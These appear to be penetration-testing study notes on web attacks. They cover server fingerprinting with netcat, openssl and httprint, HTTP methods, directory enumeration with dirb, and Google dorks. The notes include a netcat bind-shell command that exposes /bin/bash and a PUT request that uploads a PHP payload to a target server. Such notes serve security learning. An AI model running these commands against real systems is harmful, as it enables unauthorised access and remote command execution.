# Web Attacks

## Fingerprinting with Netcat

Netcat can be used to fingerprint the web server, it acts as both client and server.

```
nc <target> 80
HEAD / HTTP/1.0
```
Limitation with Netcat is that it cannot connect to HTTPS connections, So to connect to the HTTPS connection we can use **_OpenSSL_** command line tool.

## Fingerprinting with OpenSSL

```
openssl s_client -connect target.site:443
HEAD / HTTP/1.0
```

## Fingerprinting with Httprint

**_Httprint_** is a web server fingerprinting tool that uses a signature-based technique to identify web servers.

```
httprint -P0 -h <target hosts> -s <signature file>
```


* -P0 : Do not ping.
* -h  : Target hosts.
* -s  : set signature file to use.
* signature file location : ```/usr/share/httprint/signature.txt```

## HTTP Verbs

The most common HTTP methods are:

* GET   : used to request resources from web server
* POST  : used to submit form data to web server
* HEAD  : only asks for headers of the response, excludes body
* DELETE: used to remove a file/data from the server
* PUT   : used to **upload** file to the server
    
    To exploit the **PUT** method attacker needs to know the exact file uploading to the server. This can be done by using **_wc_** (word count) utility with **_-m_** parameter in linux.
    
    ```wc -m payload.php```
    
    After creating the payload and determining its size, use the following command to upload the payload to the server.
    
    ```
    nc target.com 80
    PUT /payload.php HTTP/1.0
    Content-type  : text/html
    Content-length  : 20
    
    <?php phpinfo(); ?>
    ```

## Netcat

```nc -lvp 8888``` Listener client

```nc -v 127.0.0.1 8888``` Server

Netcat udp connection

```nc -lvup 9999``` Listener client

```nc -vu 127.0.0.1 9999``` Server

Send or receive data through a file

```nc -lvp 8888 > received.txt``` Listener client

```echo "Hello" | nc -v 127.0.0.1 8888``` Server

Obtain remote **Bind Shell** using **Netcat**

```nc -lvp 8888 -e /bin/bash``` Listener client

```nc -v 127.0.0.1 8888``` Server

## Dirb

Dirb is a command line tool for enumerating directories and files.

Basic usage command, when not specified wordlist it uses by default wordlist for enumeration.

```dirb http://target.com```

Dirb wordlist location

```/usr/share/dirb/wordlists```

Usage with custom wordlist

```dirb http://target.com /usr/share/dirb/wordlists/common.txt```

[Seclists](https://github.com/danielmiessler/SecLists) wordlists collection

Dirb options:

```-a : custom user agent``` [useragents list](http://useragentstring.com/pages/useragentstring.php)

```dirb http:target.com -a "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0"```

```
-p : proxy option
dirb http://192.168.121.12 -p http://127.0.0.1:8080
```

```
-c : authentication using cookie
dirb http://192.168.121.12 -p http://127.0.0.1:8080 -c "COOKIE:XYZ"
```

```
-u : basic HTTP authentication, uses username and password combination
dirb http://192.168.121.12 -p http://127.0.0.1:8080 -u "admin:password"
```
```
-H : add custom header to HTTP request
dirb http://192.168.121.12 -p http://127.0.0.1:8080 -H "HeaderName: HeaderValue"
```

```-r :Don't search recursively```

```
-z : delay timing
dirb http://192.168.121.12 -z 1000
```

```
-S : silent mode
dirb http://192.168.121.12 -S
```

```
-X : extensions
dirb http://192.168.121.12 -X ".php,.bak"

-x : extensions list
dirb http://192.168.121.12 -x extensions.txt
```

## Google Hacking

Google hacking or Google Dorks is a technique to use Google's advance query commands to discover specific files and directories on a website.

```
inurl:admin intitle:login
site: example.com
intitle: login
filetype: pdf
```
